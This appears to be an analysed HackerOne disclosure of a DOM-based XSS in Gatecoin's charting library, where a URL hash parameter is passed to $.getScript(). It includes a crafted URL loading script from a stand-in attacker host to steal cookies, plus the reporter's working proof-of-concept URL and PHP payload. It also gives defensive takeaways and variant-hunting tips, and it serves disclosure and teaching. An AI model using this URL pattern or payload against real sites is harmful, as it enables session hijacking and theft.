# DOM Based XSS in Charting Library via indicatorsFile Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 351275 | https://hackerone.com/reports/351275
- **Submitted:** 2018-05-14
- **Reporter:** bobrov
- **Program:** Gatecoin
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** DOM-based Cross-Site Scripting (XSS), Unsafe Dynamic Script Loading, URL Parameter Injection
- **CVEs:** None
- **Category:** web-api

## Summary
The charting_library's tv-chart.html contains a DOM-based XSS vulnerability where user-controlled URL parameters are directly passed to $.getScript() without validation, allowing arbitrary JavaScript execution. An attacker can craft a malicious URL with the indicatorsFile parameter pointing to an external domain to execute arbitrary code in the victim's browser under the context of the target domain.

## Attack scenario
1. Attacker identifies the vulnerable charting_library endpoint at gatecoin.com/widget-trade/assets/charting_library/static/tv-chart.html
2. Attacker crafts a malicious URL with indicatorsFile parameter pointing to attacker-controlled server: https://gatecoin.com/widget-trade/assets/charting_library/static/tv-chart.html#indicatorsFile=//attacker.com/malicious.js
3. Attacker hosts JavaScript payload on their server that steals cookies, session tokens, or performs actions on behalf of the user
4. Attacker sends crafted URL to victim via phishing email, social media, or malicious website
5. Victim clicks the link and visits the URL while authenticated to Gatecoin
6. The library.js script parses the indicatorsFile parameter and passes it directly to $.getScript(), loading and executing the attacker's JavaScript in the victim's browser with access to their session

## Root cause
The application fails to validate or sanitize the indicatorsFile URL parameter before using it in $.getScript(). The parameter is extracted from the URL hash and used directly in a jQuery AJAX call without any whitelist validation, origin checking, or URL parsing controls.

## Attacker mindset
An attacker would recognize that charting libraries are commonly embedded in financial applications and that URL hash parameters are often overlooked during security reviews. The combination of user-controlled input + dynamic script loading creates an obvious exploitation opportunity to steal authentication tokens or perform unauthorized trading actions on behalf of compromised users.

## Defensive takeaways
- Never use $.getScript() or dynamically load scripts based on user-supplied URL parameters without strict validation
- Implement a whitelist of allowed script sources and validate against it before loading
- Use Content Security Policy (CSP) with script-src restrictions to prevent loading scripts from unauthorized origins
- Sanitize and validate all URL parameters, especially those controlling resource loading
- Consider using Subresource Integrity (SRI) if loading external scripts is necessary
- Implement CORS headers carefully - broad Access-Control-Allow-Origin headers can amplify XSS impact
- Review third-party charting libraries for similar unsafe patterns before integration
- Use URL parsing functions to validate that script URLs match expected domains

## Variant hunting
Search for other $.getScript() or $.ajax() calls with user-controlled parameters in library.js and similar charting libraries
Check for similar vulnerable patterns in other parameters like 'theme', 'dataFile', 'configFile', or 'pluginFile'
Investigate if other charting library vendors (TradingView, Chart.js) have similar implementations
Look for dynamically loaded resources in other widget/embed endpoints of Gatecoin
Test other hash/query parameters for similar injection vulnerabilities
Check if JSONP endpoints exist that could be exploited with parameter injection

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing
- T1566 - Phishing
- T1105 - Ingress Tool Transfer
- T1203 - Exploitation for Client Execution

## Notes
This is a classic DOM-based XSS resulting from unsafe use of user input in dynamic script loading. The use of hash parameters (#) rather than query parameters suggests an attempt at client-side handling, but improper implementation creates the vulnerability. The attacker's PoC effectively demonstrates session hijacking capability by accessing document.cookie. The financial nature of Gatecoin makes this particularly severe as compromised sessions could lead to unauthorized transactions.

## Full report
<details><summary>Expand</summary>

**Description**
charting_library contains a DOM Based XSS vulnerability that allows to load an external JS script and execute it.

**PoC**
Open URL in any browser
```
https://gatecoin.com/widget-trade/assets/charting_library/static/tv-chart.html#indicatorsFile=//blackfan.ru/tv-chart-poc&disabledFeatures=[]&enabledFeatures=[]
```

**Vulnerable script**
https://gatecoin.com/widget-trade/assets/charting_library/static/bundles/library.js

**Vulnerable code**
```js
$.getScript(urlParams.indicatorsFile)
```

blackfan.ru/tv-chart-poc source
```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: cache-control, X-Requested-With");
?>
alert(document.domain); 
alert(document.cookie); 
```

## Impact

DOM Based XSS

</details>

---
*Analysed by Claude on 2026-05-12*
